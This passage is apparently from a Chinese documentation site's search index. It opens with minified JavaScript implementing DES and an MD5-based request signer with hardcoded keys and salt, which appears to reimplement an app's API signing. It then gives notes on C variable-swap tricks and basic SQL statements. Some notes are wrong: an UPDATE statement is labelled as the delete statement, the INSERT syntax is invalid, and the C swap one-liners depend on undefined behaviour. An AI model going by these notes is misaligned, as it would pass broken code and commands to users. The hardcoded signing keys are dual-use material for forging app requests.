\u0026gt; s; l--) t *= 2; a[16 * n + s] = parseInt(c / t) % 2; } } return a; } function a(r) { var e; switch (r) { case \u0026#34;0000\u0026#34;: e = \u0026#34;0\u0026#34;; break; case \u0026#34;0001\u0026#34;: e = \u0026#34;1\u0026#34;; break; case \u0026#34;0010\u0026#34;: e = \u0026#34;2\u0026#34;; break; case \u0026#34;0011\u0026#34;: e = \u0026#34;3\u0026#34;; break; case \u0026#34;0100\u0026#34;: e = \u0026#34;4\u0026#34;; break; case \u0026#34;0101\u0026#34;: e = \u0026#34;5\u0026#34;; break; case \u0026#34;0110\u0026#34;: e = \u0026#34;6\u0026#34;; break; case \u0026#34;0111\u0026#34;: e = \u0026#34;7\u0026#34;; break; case \u0026#34;1000\u0026#34;: e = \u0026#34;8\u0026#34;; break; case \u0026#34;1001\u0026#34;: e = \u0026#34;9\u0026#34;; break; case \u0026#34;1010\u0026#34;: e = \u0026#34;A\u0026#34;; break; case \u0026#34;1011\u0026#34;: e = \u0026#34;B\u0026#34;; break; case \u0026#34;1100\u0026#34;: e = \u0026#34;C\u0026#34;; break; case \u0026#34;1101\u0026#34;: e = \u0026#34;D\u0026#34;; break; case \u0026#34;1110\u0026#34;: e = \u0026#34;E\u0026#34;; break; case \u0026#34;1111\u0026#34;: e = \u0026#34;F\u0026#34;; } return e; } function n(r) { for (var e = \u0026#34;\u0026#34;, n = 0; n \u0026lt; 16; n++) { for (var s = \u0026#34;\u0026#34;, f = 0; f \u0026lt; 4; f++) s += r[4 * n + f]; e += a(s); } return e; } function s(r, e) { var a = k(e), n = f(r), s = new Array(32), b = new Array(32), i = new Array(32), w = 0, v = 0, A = 0, y = 0, h = 0; for (A = 0; A \u0026lt; 32; A++) s[A] = n[A], b[A] = n[32 + A]; for (w = 0; w \u0026lt; 16; w++) { for (v = 0; v \u0026lt; 32; v++) i[v] = s[v], s[v] = b[v]; var g = new Array(48); for (y = 0; y \u0026lt; 48; y++) g[y] = a[w][y]; var p = c(l(t(c(o(b), g))), i); for (h = 0; h \u0026lt; 32; h++) b[h] = p[h]; } var I = new Array(64); for (w = 0; w \u0026lt; 32; w++) I[w] = b[w], I[32 + w] = s[w]; return u(I); } function f(r) { for (var e = new Array(64), a = 0, n = 1, s = 0; a \u0026lt; 4; a++, n += 2, s += 2) for (var f = 7, o = 0; f \u0026gt;= 0; f--, o++) e[8 * a + o] = r[8 * f + n], e[8 * a + o + 32] = r[8 * f + s]; return e; } function o(r) { for (var e = new Array(48), a = 0; a \u0026lt; 8; a++) e[6 * a + 0] = 0 == a ? r[31] : r[4 * a - 1], e[6 * a + 1] = r[4 * a + 0], e[6 * a + 2] = r[4 * a + 1], e[6 * a + 3] = r[4 * a + 2], e[6 * a + 4] = r[4 * a + 3], e[6 * a + 5] = 7 == a ? r[0] : r[4 * a + 4]; return e; } function c(r, e) { for (var a = new Array(r.length), n = 0; n \u0026lt; r.length; n++) a[n] = r[n] ^ e[n]; return a; } function t(r) { for (var e = new Array(32), a = \u0026#34;\u0026#34;, n = [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]], s = [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10], [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5], [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15], [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]], f = [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8], [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1], [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7], [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]], o = [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15], [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9], [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4], [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]], c = [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9], [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6], [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14], [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]], t = [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11], [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8], [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6], [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]], l = [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1], [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6], [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2], [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]], u = [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7], [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2], [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8], [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]], k = 0; k \u0026lt; 8; k++) { var i, w; switch (i = 2 * r[6 * k + 0] + r[6 * k + 5], w = 2 * r[6 * k + 1] * 2 * 2 + 2 * r[6 * k + 2] * 2 + 2 * r[6 * k + 3] + r[6 * k + 4], k) { case 0: a = b(n[i][w]); break; case 1: a = b(s[i][w]); break; case 2: a = b(f[i][w]); break; case 3: a = b(o[i][w]); break; case 4: a = b(c[i][w]); break; case 5: a = b(t[i][w]); break; case 6: a = b(l[i][w]); break; case 7: a = b(u[i][w]); } e[4 * k + 0] = parseInt(a.substring(0, 1)), e[4 * k + 1] = parseInt(a.substring(1, 2)), e[4 * k + 2] = parseInt(a.substring(2, 3)), e[4 * k + 3] = parseInt(a.substring(3, 4)); } return e; } function l(r) { var e = new Array(32); return e[0] = r[15], e[1] = r[6], e[2] = r[19], e[3] = r[20], e[4] = r[28], e[5] = r[11], e[6] = r[27], e[7] = r[16], e[8] = r[0], e[9] = r[14], e[10] = r[22], e[11] = r[25], e[12] = r[4], e[13] = r[17], e[14] = r[30], e[15] = r[9], e[16] = r[1], e[17] = r[7], e[18] = r[23], e[19] = r[13], e[20] = r[31], e[21] = r[26], e[22] = r[2], e[23] = r[8], e[24] = r[18], e[25] = r[12], e[26] = r[29], e[27] = r[5], e[28] = r[21], e[29] = r[10], e[30] = r[3], e[31] = r[24], e; } function u(r) { var e = new Array(64); return e[0] = r[39], e[1] = r[7], e[2] = r[47], e[3] = r[15], e[4] = r[55], e[5] = r[23], e[6] = r[63], e[7] = r[31], e[8] = r[38], e[9] = r[6], e[10] = r[46], e[11] = r[14], e[12] = r[54], e[13] = r[22], e[14] = r[62], e[15] = r[30], e[16] = r[37], e[17] = r[5], e[18] = r[45], e[19] = r[13], e[20] = r[53], e[21] = r[21], e[22] = r[61], e[23] = r[29], e[24] = r[36], e[25] = r[4], e[26] = r[44], e[27] = r[12], e[28] = r[52], e[29] = r[20], e[30] = r[60], e[31] = r[28], e[32] = r[35], e[33] = r[3], e[34] = r[43], e[35] = r[11], e[36] = r[51], e[37] = r[19], e[38] = r[59], e[39] = r[27], e[40] = r[34], e[41] = r[2], e[42] = r[42], e[43] = r[10], e[44] = r[50], e[45] = r[18], e[46] = r[58], e[47] = r[26], e[48] = r[33], e[49] = r[1], e[50] = r[41], e[51] = r[9], e[52] = r[49], e[53] = r[17], e[54] = r[57], e[55] = r[25], e[56] = r[32], e[57] = r[0], e[58] = r[40], e[59] = r[8], e[60] = r[48], e[61] = r[16], e[62] = r[56], e[63] = r[24], e; } function b(r) { var e = \u0026#34;\u0026#34;; switch (r) { case 0: e = \u0026#34;0000\u0026#34;; break; case 1: e = \u0026#34;0001\u0026#34;; break; case 2: e = \u0026#34;0010\u0026#34;; break; case 3: e = \u0026#34;0011\u0026#34;; break; case 4: e = \u0026#34;0100\u0026#34;; break; case 5: e = \u0026#34;0101\u0026#34;; break; case 6: e = \u0026#34;0110\u0026#34;; break; case 7: e = \u0026#34;0111\u0026#34;; break; case 8: e = \u0026#34;1000\u0026#34;; break; case 9: e = \u0026#34;1001\u0026#34;; break; case 10: e = \u0026#34;1010\u0026#34;; break; case 11: e = \u0026#34;1011\u0026#34;; break; case 12: e = \u0026#34;1100\u0026#34;; break; case 13: e = \u0026#34;1101\u0026#34;; break; case 14: e = \u0026#34;1110\u0026#34;; break; case 15: e = \u0026#34;1111\u0026#34;; } return e; } function k(r) { var e = new Array(56), a = new Array(); a[0] = new Array(), a[1] = new Array(), a[2] = new Array(), a[3] = new Array(), a[4] = new Array(), a[5] = new Array(), a[6] = new Array(), a[7] = new Array(), a[8] = new Array(), a[9] = new Array(), a[10] = new Array(), a[11] = new Array(), a[12] = new Array(), a[13] = new Array(), a[14] = new Array(), a[15] = new Array(); for (var n = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1], s = 0; s \u0026lt; 7; s++) for (var f = 0, o = 7; f \u0026lt; 8; f++, o--) e[8 * s + f] = r[8 * o + s]; s = 0; for (s = 0; s \u0026lt; 16; s++) { var c = 0, t = 0; for (f = 0; f \u0026lt; n[s]; f++) { for (c = e[0], t = e[28], o = 0; o \u0026lt; 27; o++) e[o] = e[o + 1], e[28 + o] = e[29 + o]; e[27] = c, e[55] = t; } var l = new Array(48); switch (l[0] = e[13], l[1] = e[16], l[2] = e[10], l[3] = e[23], l[4] = e[0], l[5] = e[4], l[6] = e[2], l[7] = e[27], l[8] = e[14], l[9] = e[5], l[10] = e[20], l[11] = e[9], l[12] = e[22], l[13] = e[18], l[14] = e[11], l[15] = e[3], l[16] = e[25], l[17] = e[7], l[18] = e[15], l[19] = e[6], l[20] = e[26], l[21] = e[19], l[22] = e[12], l[23] = e[1], l[24] = e[40], l[25] = e[51], l[26] = e[30], l[27] = e[36], l[28] = e[46], l[29] = e[54], l[30] = e[29], l[31] = e[39], l[32] = e[50], l[33] = e[44], l[34] = e[32], l[35] = e[47], l[36] = e[43], l[37] = e[48], l[38] = e[38], l[39] = e[55], l[40] = e[33], l[41] = e[52], l[42] = e[45], l[43] = e[41], l[44] = e[49], l[45] = e[35], l[46] = e[28], l[47] = e[31], s) { case 0: for (var u = 0; u \u0026lt; 48; u++) a[0][u] = l[u]; break; case 1: for (u = 0; u \u0026lt; 48; u++) a[1][u] = l[u]; break; case 2: for (u = 0; u \u0026lt; 48; u++) a[2][u] = l[u]; break; case 3: for (u = 0; u \u0026lt; 48; u++) a[3][u] = l[u]; break; case 4: for (u = 0; u \u0026lt; 48; u++) a[4][u] = l[u]; break; case 5: for (u = 0; u \u0026lt; 48; u++) a[5][u] = l[u]; break; case 6: for (u = 0; u \u0026lt; 48; u++) a[6][u] = l[u]; break; case 7: for (u = 0; u \u0026lt; 48; u++) a[7][u] = l[u]; break; case 8: for (u = 0; u \u0026lt; 48; u++) a[8][u] = l[u]; break; case 9: for (u = 0; u \u0026lt; 48; u++) a[9][u] = l[u]; break; case 10: for (u = 0; u \u0026lt; 48; u++) a[10][u] = l[u]; break; case 11: for (u = 0; u \u0026lt; 48; u++) a[11][u] = l[u]; break; case 12: for (u = 0; u \u0026lt; 48; u++) a[12][u] = l[u]; break; case 13: for (u = 0; u \u0026lt; 48; u++) a[13][u] = l[u]; break; case 14: for (u = 0; u \u0026lt; 48; u++) a[14][u] = l[u]; break; case 15: for (u = 0; u \u0026lt; 48; u++) a[15][u] = l[u]; } } return a; } // module.exports = { function getTime() { return function (a, f, o, c) { var t, l, u, b, k, i, w = a.length, v = \u0026#34;\u0026#34;; null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; (t = r(f), b = t.length); null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o \u0026amp;\u0026amp; (l = r(o), k = l.length); null != c \u0026amp;\u0026amp; \u0026#34;\u0026#34; != c \u0026amp;\u0026amp; (u = r(c), i = u.length); if (w \u0026gt; 0) if (w \u0026lt; 4) { var A = e(a); if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o \u0026amp;\u0026amp; null != c \u0026amp;\u0026amp; \u0026#34;\u0026#34; != c) { for ($ = A, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); for (d = 0; d \u0026lt; i; d++) $ = s($, u[d]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o) { for ($ = A, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f) { var y = 0; for ($ = A, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); x = $; } v = n(x); } else { var h = parseInt(w / 4), g = w % 4, p = 0; for (p = 0; p \u0026lt; h; p++) { var I = e(a.substring(4 * p + 0, 4 * p + 4)); if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o \u0026amp;\u0026amp; null != c \u0026amp;\u0026amp; \u0026#34;\u0026#34; != c) { for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); for (d = 0; d \u0026lt; i; d++) $ = s($, u[d]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o) { for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f) { for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); x = $; } v += n(x); } if (g \u0026gt; 0) { var x; I = e(a.substring(4 * h + 0, w)); if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o \u0026amp;\u0026amp; null != c \u0026amp;\u0026amp; \u0026#34;\u0026#34; != c) { var d; for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); for (d = 0; d \u0026lt; i; d++) $ = s($, u[d]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o) { var C; for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f) { var $; for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); x = $; } v += n(x); } } return v; }(\u0026#34;saywash#\u0026#34; + new Date().valueOf(), \u0026#34;hlF#$1x)\u0026#34;, \u0026#34;hlG#$2x)\u0026#34;, \u0026#34;hlH#$3x)\u0026#34;); } function sign(e) { Array.prototype.indexVf = function (r) { for (var e = 0; e \u0026lt; this.length; e++) if (this[e] == r) return e; } var t = [], n = [], i = []; for (var s in e) t.push(s), i.push(s), n.push(e[s]); for (var o = i.sort(), u = \u0026#34;SING=HLYF\u0026#34;, f = 0; f \u0026lt; o.length; f++) if (\u0026#34;tokenId\u0026#34; != o[f] \u0026amp;\u0026amp; \u0026#34;ssid\u0026#34; != o[f] \u0026amp;\u0026amp; \u0026#34;sign\u0026#34; != o[f]) { var a = t.indexVf(o[f]); \u0026#34;\u0026#34; != n[a] \u0026amp;\u0026amp; null != n[a] \u0026amp;\u0026amp; (u = u + \u0026#34;\u0026amp;\u0026#34; + o[f] + \u0026#34;=\u0026#34; + n[a]); } return \u0026#34;SING=HLYF\u0026#34; == (u = u.toUpperCase()) \u0026amp;\u0026amp; (u = \u0026#34;SING=HLYF\u0026amp;\u0026#34;), u = md5(u); } function md5(string) { function md5_RotateLeft(lValue, iShiftBits) { return (lValue \u0026lt;\u0026lt; iShiftBits) | (lValue \u0026gt;\u0026gt;\u0026gt; (32 - iShiftBits)); } function md5_AddUnsigned(lX, lY) { var lX4, lY4, lX8, lY8, lResult; lX8 = (lX \u0026amp; 0x80000000); lY8 = (lY \u0026amp; 0x80000000); lX4 = (lX \u0026amp; 0x40000000); lY4 = (lY \u0026amp; 0x40000000); lResult = (lX \u0026amp; 0x3FFFFFFF) + (lY \u0026amp; 0x3FFFFFFF); if (lX4 \u0026amp; lY4) { return (lResult ^ 0x80000000 ^ lX8 ^ lY8); } if (lX4 | lY4) { if (lResult \u0026amp; 0x40000000) { return (lResult ^ 0xC0000000 ^ lX8 ^ lY8); } else { return (lResult ^ 0x40000000 ^ lX8 ^ lY8); } } else { return (lResult ^ lX8 ^ lY8); } } function md5_F(x, y, z) { return (x \u0026amp; y) | ((~x) \u0026amp; z); } function md5_G(x, y, z) { return (x \u0026amp; z) | (y \u0026amp; (~z)); } function md5_H(x, y, z) { return (x ^ y ^ z); } function md5_I(x, y, z) { return (y ^ (x | (~z))); } function md5_FF(a, b, c, d, x, s, ac) { a = md5_AddUnsigned(a, md5_AddUnsigned(md5_AddUnsigned(md5_F(b, c, d), x), ac)); return md5_AddUnsigned(md5_RotateLeft(a, s), b); }; function md5_GG(a, b, c, d, x, s, ac) { a = md5_AddUnsigned(a, md5_AddUnsigned(md5_AddUnsigned(md5_G(b, c, d), x), ac)); return md5_AddUnsigned(md5_RotateLeft(a, s), b); }; function md5_HH(a, b, c, d, x, s, ac) { a = md5_AddUnsigned(a, md5_AddUnsigned(md5_AddUnsigned(md5_H(b, c, d), x), ac)); return md5_AddUnsigned(md5_RotateLeft(a, s), b); }; function md5_II(a, b, c, d, x, s, ac) { a = md5_AddUnsigned(a, md5_AddUnsigned(md5_AddUnsigned(md5_I(b, c, d), x), ac)); return md5_AddUnsigned(md5_RotateLeft(a, s), b); }; function md5_ConvertToWordArray(string) { var lWordCount; var lMessageLength = string.length; var lNumberOfWords_temp1 = lMessageLength + 8; var lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64; var lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16; var lWordArray = Array(lNumberOfWords - 1); var lBytePosition = 0; var lByteCount = 0; while (lByteCount \u0026lt; lMessageLength) { lWordCount = (lByteCount - (lByteCount % 4)) / 4; lBytePosition = (lByteCount % 4) * 8; lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount) \u0026lt;\u0026lt; lBytePosition)); lByteCount++; } lWordCount = (lByteCount - (lByteCount % 4)) / 4; lBytePosition = (lByteCount % 4) * 8; lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80 \u0026lt;\u0026lt; lBytePosition); lWordArray[lNumberOfWords - 2] = lMessageLength \u0026lt;\u0026lt; 3; lWordArray[lNumberOfWords - 1] = lMessageLength \u0026gt;\u0026gt;\u0026gt; 29; return lWordArray; }; function md5_WordToHex(lValue) { var WordToHexValue = \u0026#34;\u0026#34;, WordToHexValue_temp = \u0026#34;\u0026#34;, lByte, lCount; for (lCount = 0; lCount \u0026lt;= 3; lCount++) { lByte = (lValue \u0026gt;\u0026gt;\u0026gt; (lCount * 8)) \u0026amp; 255; WordToHexValue_temp = \u0026#34;0\u0026#34; + lByte.toString(16); WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length - 2, 2); } return WordToHexValue; }; function md5_Utf8Encode(string) { string = string.replace(/\\r\\n/g, \u0026#34;\\n\u0026#34;); var utftext = \u0026#34;\u0026#34;; for (var n = 0; n \u0026lt; string.length; n++) { var c = string.charCodeAt(n); if (c \u0026lt; 128) { utftext += String.fromCharCode(c); } else if ((c \u0026gt; 127) \u0026amp;\u0026amp; (c \u0026lt; 2048)) { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 6) | 192); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } else { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 12) | 224); utftext += String.fromCharCode(((c \u0026gt;\u0026gt; 6) \u0026amp; 63) | 128); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } } return utftext; }; var x = Array(); var k, AA, BB, CC, DD, a, b, c, d; var S11 = 7, S12 = 12, S13 = 17, S14 = 22; var S21 = 5, S22 = 9, S23 = 14, S24 = 20; var S31 = 4, S32 = 11, S33 = 16, S34 = 23; var S41 = 6, S42 = 10, S43 = 15, S44 = 21; string = md5_Utf8Encode(string); x = md5_ConvertToWordArray(string); a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476; for (k = 0; k \u0026lt; x.length; k += 16) { AA = a; BB = b; CC = c; DD = d; a = md5_FF(a, b, c, d, x[k + 0], S11, 0xD76AA478); d = md5_FF(d, a, b, c, x[k + 1], S12, 0xE8C7B756); c = md5_FF(c, d, a, b, x[k + 2], S13, 0x242070DB); b = md5_FF(b, c, d, a, x[k + 3], S14, 0xC1BDCEEE); a = md5_FF(a, b, c, d, x[k + 4], S11, 0xF57C0FAF); d = md5_FF(d, a, b, c, x[k + 5], S12, 0x4787C62A); c = md5_FF(c, d, a, b, x[k + 6], S13, 0xA8304613); b = md5_FF(b, c, d, a, x[k + 7], S14, 0xFD469501); a = md5_FF(a, b, c, d, x[k + 8], S11, 0x698098D8); d = md5_FF(d, a, b, c, x[k + 9], S12, 0x8B44F7AF); c = md5_FF(c, d, a, b, x[k + 10], S13, 0xFFFF5BB1); b = md5_FF(b, c, d, a, x[k + 11], S14, 0x895CD7BE); a = md5_FF(a, b, c, d, x[k + 12], S11, 0x6B901122); d = md5_FF(d, a, b, c, x[k + 13], S12, 0xFD987193); c = md5_FF(c, d, a, b, x[k + 14], S13, 0xA679438E); b = md5_FF(b, c, d, a, x[k + 15], S14, 0x49B40821); a = md5_GG(a, b, c, d, x[k + 1], S21, 0xF61E2562); d = md5_GG(d, a, b, c, x[k + 6], S22, 0xC040B340); c = md5_GG(c, d, a, b, x[k + 11], S23, 0x265E5A51); b = md5_GG(b, c, d, a, x[k + 0], S24, 0xE9B6C7AA); a = md5_GG(a, b, c, d, x[k + 5], S21, 0xD62F105D); d = md5_GG(d, a, b, c, x[k + 10], S22, 0x2441453); c = md5_GG(c, d, a, b, x[k + 15], S23, 0xD8A1E681); b = md5_GG(b, c, d, a, x[k + 4], S24, 0xE7D3FBC8); a = md5_GG(a, b, c, d, x[k + 9], S21, 0x21E1CDE6); d = md5_GG(d, a, b, c, x[k + 14], S22, 0xC33707D6); c = md5_GG(c, d, a, b, x[k + 3], S23, 0xF4D50D87); b = md5_GG(b, c, d, a, x[k + 8], S24, 0x455A14ED); a = md5_GG(a, b, c, d, x[k + 13], S21, 0xA9E3E905); d = md5_GG(d, a, b, c, x[k + 2], S22, 0xFCEFA3F8); c = md5_GG(c, d, a, b, x[k + 7], S23, 0x676F02D9); b = md5_GG(b, c, d, a, x[k + 12], S24, 0x8D2A4C8A); a = md5_HH(a, b, c, d, x[k + 5], S31, 0xFFFA3942); d = md5_HH(d, a, b, c, x[k + 8], S32, 0x8771F681); c = md5_HH(c, d, a, b, x[k + 11], S33, 0x6D9D6122); b = md5_HH(b, c, d, a, x[k + 14], S34, 0xFDE5380C); a = md5_HH(a, b, c, d, x[k + 1], S31, 0xA4BEEA44); d = md5_HH(d, a, b, c, x[k + 4], S32, 0x4BDECFA9); c = md5_HH(c, d, a, b, x[k + 7], S33, 0xF6BB4B60); b = md5_HH(b, c, d, a, x[k + 10], S34, 0xBEBFBC70); a = md5_HH(a, b, c, d, x[k + 13], S31, 0x289B7EC6); d = md5_HH(d, a, b, c, x[k + 0], S32, 0xEAA127FA); c = md5_HH(c, d, a, b, x[k + 3], S33, 0xD4EF3085); b = md5_HH(b, c, d, a, x[k + 6], S34, 0x4881D05); a = md5_HH(a, b, c, d, x[k + 9], S31, 0xD9D4D039); d = md5_HH(d, a, b, c, x[k + 12], S32, 0xE6DB99E5); c = md5_HH(c, d, a, b, x[k + 15], S33, 0x1FA27CF8); b = md5_HH(b, c, d, a, x[k + 2], S34, 0xC4AC5665); a = md5_II(a, b, c, d, x[k + 0], S41, 0xF4292244); d = md5_II(d, a, b, c, x[k + 7], S42, 0x432AFF97); c = md5_II(c, d, a, b, x[k + 14], S43, 0xAB9423A7); b = md5_II(b, c, d, a, x[k + 5], S44, 0xFC93A039); a = md5_II(a, b, c, d, x[k + 12], S41, 0x655B59C3); d = md5_II(d, a, b, c, x[k + 3], S42, 0x8F0CCC92); c = md5_II(c, d, a, b, x[k + 10], S43, 0xFFEFF47D); b = md5_II(b, c, d, a, x[k + 1], S44, 0x85845DD1); a = md5_II(a, b, c, d, x[k + 8], S41, 0x6FA87E4F); d = md5_II(d, a, b, c, x[k + 15], S42, 0xFE2CE6E0); c = md5_II(c, d, a, b, x[k + 6], S43, 0xA3014314); b = md5_II(b, c, d, a, x[k + 13], S44, 0x4E0811A1); a = md5_II(a, b, c, d, x[k + 4], S41, 0xF7537E82); d = md5_II(d, a, b, c, x[k + 11], S42, 0xBD3AF235); c = md5_II(c, d, a, b, x[k + 2], S43, 0x2AD7D2BB); b = md5_II(b, c, d, a, x[k + 9], S44, 0xEB86D391); a = md5_AddUnsigned(a, AA); b = md5_AddUnsigned(b, BB); c = md5_AddUnsigned(c, CC); d = md5_AddUnsigned(d, DD); } return (md5_WordToHex(a) + md5_WordToHex(b) + md5_WordToHex(c) + md5_WordToHex(d)).toLowerCase(); } "},{"id":121,"href":"/docs/code/new/%E9%82%A3%E4%BA%9B%E9%AA%9A%E6%93%8D%E4%BD%9C/","title":"那些骚操作","section":"ee","content":"\r交换两个变量值\r#\rint main(){ int a=1,b=2; a = a + b - (b = a);//a + = b - (b = a); a = a ^ b ^ (b = a);//a ^ = b ^ (b = a); a ^ = b ^ =a ^ = b; } c printf 控制符\r#\r一个完整的占位符格式如下，其中，[ ]表示其中的内容为可选项。在下述格式中，从前住后依次是%、标志(flags)、输出宽度(width)、精度(.precision)、类型长度（length）以及说明符（specifier）。其中，%以及末尾的specifier都是必需的。\n%[flags][width][.precision][length]specifier specifier说明符处于一个占位符的末尾，是占位符不可或缺的组成部分，它定义了printf()函数以何种类型来解释和输出与占位符匹配的参数。\n# printf()使用占位符精细控制输出格式\n"},{"id":122,"href":"/docs/code/%E6%95%B0%E6%8D%AE%E5%BA%93/","title":"数据库","section":"code","content":"\r基本操作\r#\r创建数据库\ncreate database name; 删除数据库\nDROP DATABASE db; 查看所有数据库\nshow databases; 查看表结构\ndesc table_name; 选择数据库\nuse name; 切换数据库\nCONNECT db ; 删除数据表\ndrop table db_name truncate table user; delete from user; 删除表中所有\nTRUNCATE TABLE t 查询语句\nSELECT [DISTINCT]*, # \u0026#34;*\u0026#34;表示所有字段,DISTINCT去重 [字段1,]# 查询某个字段 [字段1 + 字段2 AS 型新段,] # 查询运算结果，AS 后面跟别称，可以省略 [聚合函数,] # 使用聚合函数查询 [窗口函数,] # 使用窗口函数 FROM 表1[[INNER / LEFT / RIGHT] JOIN 表2 ON 表连接条件] WHERE 条件表达式 GROUP BY [分组字段 / 表达式] HAVING 条件表达式 ORDER BY [排序字段 / 表达式] [ASC / DESC] #ASC 表示升序排序(默认) DESC 表示降序排序 LIMIT 起始行数 , 返回的行数 select 列名 from 表名 where 条件; select * from 表名; 判断是否为空\nselect colume from table_name where is null 查询并排序\nSELECT c1, c2 FROM t ORDER BY c1 ASC [DESC] 多表查询\nSELECT x.xueh AS \u0026#39;学号\u0026#39;, x.xm AS \u0026#39;姓名\u0026#39;, x.xb AS \u0026#39;性别\u0026#39;, c.cj AS \u0026#39;成绩\u0026#39; FROM xsb x INNER JOIN cjb c ON x.xueh = c.xueh 连接三张表\nSELECT x.xueh, x.xm, c.kcbh, k.kcmc, c.cj FROM xsb x INNER JOIN cjb c ON x.xueh = c.xueh INNER JOIN kcb k ON k.kcbh = c.kcbh; 删除语句\nupdate from 表名 where 字段=\u0026#39;admin1\u0026#39;; 修改语句\nupdate 表名 set 结果字段 =\u0026#39;123\u0026#39; where 条件字段=\u0026#39;admin\u0026#39;; 插入语句\ninsert into 表名(字段名 类型); 进阶\r#\r添加新列\nALTER TABLE t ADD column; 删除一列\nALTER TABLE t DROP COLUMN c ; 添加约束\nALTER TABLE t ADD constraint; 删除约束\nALTER TABLE t DROP constraint; 